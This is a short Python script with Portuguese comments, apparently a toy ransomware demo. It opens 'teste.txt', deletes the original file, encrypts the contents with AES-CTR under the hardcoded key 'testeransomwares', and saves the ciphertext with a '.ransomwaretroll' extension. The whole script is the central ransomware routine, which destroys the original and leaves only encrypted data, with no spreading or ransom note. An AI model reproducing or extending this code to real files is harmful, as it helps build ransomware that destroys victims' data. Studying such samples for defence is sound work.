import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
try:
    file = open(file_name, "rb")
    file_data = file.read()
except:
    print("Arquivo não encontrado")
    exit(1)
finally:
    file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
try:
    new_file = open(new_file, "wb")
    new_file.write(crypto_data)
except:
    print("Erro ao criar o arquivo criptografado")
    exit(1)
finally:
    new_file.close()
